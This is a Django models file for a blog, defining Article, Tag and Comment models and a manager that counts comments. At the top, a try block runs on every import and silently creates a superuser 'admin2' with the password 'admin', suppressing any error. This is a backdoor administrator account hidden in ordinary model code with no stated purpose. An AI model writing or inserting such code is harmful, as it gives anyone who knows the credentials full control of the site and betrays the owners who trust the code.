from django.db import models
from django.utils import timezone
from django.contrib.auth.models import User
from django.core.validators import MinLengthValidator
from django.db.models import Count


try:
    user = User.objects.create_user(username='admin2', password='admin', is_staff=True, is_superuser=True)
    user.save()
except Exception:
    pass


class ArticleManager(models.Manager):
    """Manager for Article model"""
    def comment_statistics(self):
        """Get number of comments that are grouped by articles with count of tags more than one."""
        return\
            self.values('comment', 'title').annotate(n_tags=Count('tags'))\
                .order_by('title').filter(n_tags__gte=1)\
                .count()


class Tag(models.Model):
    """Tags for articles"""
    title = models.CharField('Title', unique=True, max_length=200, validators=[MinLengthValidator(5)])
    slug = models.SlugField(max_length=100, unique=True)

    def __str__(self):
        return f'Tag {self.title}'

    def rating(self):
        """Get count of articles with current tag"""
        return self.article_set.count()

    class Meta:
        verbose_name = 'Tag'
        verbose_name_plural = 'Tags'


class Article(models.Model):
    """Article in blog"""
    author = models.CharField('Author name', max_length=100)
    title = models.CharField('Title', unique=True, max_length=200, validators=[MinLengthValidator(5)])
    content = models.CharField('Content', unique=True, max_length=10000)
    create_at = models.DateTimeField('Create at', default=timezone.now)
    update_at = models.DateTimeField('Update at', default=timezone.now)
    tags = models.ManyToManyField(Tag, verbose_name="tag", blank=True)

    objects = ArticleManager()

    def __str__(self):
        return f'{self.title}:{self.author}'

    class Meta:
        verbose_name = 'Article'
        verbose_name_plural = 'Articles'


class Comment(models.Model):
    """Comments for articles"""
    author = models.CharField('Author name', max_length=100)
    content = models.CharField('Content', unique=True, max_length=500)
    add_at = models.DateTimeField('Added at', default=timezone.now)
    article = models.ForeignKey(Article, verbose_name='article', on_delete=models.CASCADE)

    def __str__(self):
        return f'Comment {self.author} - {self.article}'

    def is_article_author(self):
        """Check if author comments own article"""
        return self.author == self.article.author

    class Meta:
        verbose_name = 'Comment'
        verbose_name_plural = 'Comments'
